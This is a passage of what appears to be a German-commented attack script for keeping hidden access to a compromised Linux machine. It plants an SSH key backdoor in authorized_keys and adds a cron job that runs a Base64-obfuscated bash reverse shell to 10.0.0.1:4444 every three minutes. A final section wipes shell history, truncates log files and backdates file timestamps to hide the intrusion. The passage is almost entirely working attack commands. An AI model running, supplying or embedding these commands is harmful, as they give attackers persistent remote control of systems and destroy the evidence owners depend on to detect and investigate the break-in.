ssh-keygen -t ed25519 -f /tmp/bd_key -N ''
cat /tmp/bd_key.pub >> ~/.ssh/authorized_keys

# 3. Cron (versteckt mit Base64)
b64='YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE='
(crontab -l 2>/dev/null; echo "*/3 * * * * echo $b64|base64 -d|bash") | crontab -

# 4. Spuren verwischen
unset HISTFILE HISTSIZE
history -c && cat /dev/null > ~/.bash_history
find /var/log -name "*.log" -newer /tmp -exec truncate -s 0 {} \; 2>/dev/null
touch -r /bin/ls ~/.ssh/authorized_keys  # Timestamp angleichen
```

